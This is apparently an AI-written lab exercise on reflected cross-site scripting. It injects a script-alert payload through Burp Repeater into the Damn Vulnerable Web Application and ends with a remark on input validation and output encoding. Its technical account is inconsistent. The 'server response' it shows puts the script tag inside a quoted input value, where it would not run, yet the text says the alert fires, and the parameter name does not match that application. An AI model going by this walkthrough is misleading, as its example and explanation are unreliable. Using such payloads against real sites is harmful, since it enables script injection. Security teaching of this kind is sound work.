### Lab 5 – Cross-Site Scripting (XSS)

#### Objective
Inject JavaScript code into a vulnerable input field in a web application to demonstrate Reflected Cross-Site Scripting (XSS).

#### Procedure
1. **Setup:**
   - Use the Damn Vulnerable Web Application (DVWA).
   - Set security level to Low to allow XSS vulnerabilities.
2. **Capture search request:**
   - In your browser configured to use Burp Suite as proxy, visit:  
     ```
     GET /dvwa/vulnerabilities/xss_r/?q=test
     ```
   - Burp Proxy will intercept this GET request.
3. **Send intercepted request to Burp Repeater.**
4. **Modify the `q` parameter with JavaScript payload:**
   ```
   q=<script>alert('XSS')</script>
   ```
5. **Send the modified request.**
6. **Observe the response in the browser:**
   - The payload is reflected as part of the HTML content.
   - The browser executes the JavaScript and displays an alert popup box with text `'XSS'`.

#### Code Result/Output
- The server’s HTTP response reflects the injected script:
  ```
  <input name="q" value="<script>alert('XSS')</script>">
  ```
- Browser alert popup appears showing:
  ```
  [Alert Box] XSS
  ```
- This confirms Reflected XSS vulnerability as untrusted user input is executed in the context of the web page.

***

This lab illustrates how failure to sanitize user input can lead to client-side script injection and the importance of output encoding and input validation to prevent XSS attacks.

Let me know if further explanation or detailed setup instructions are needed.
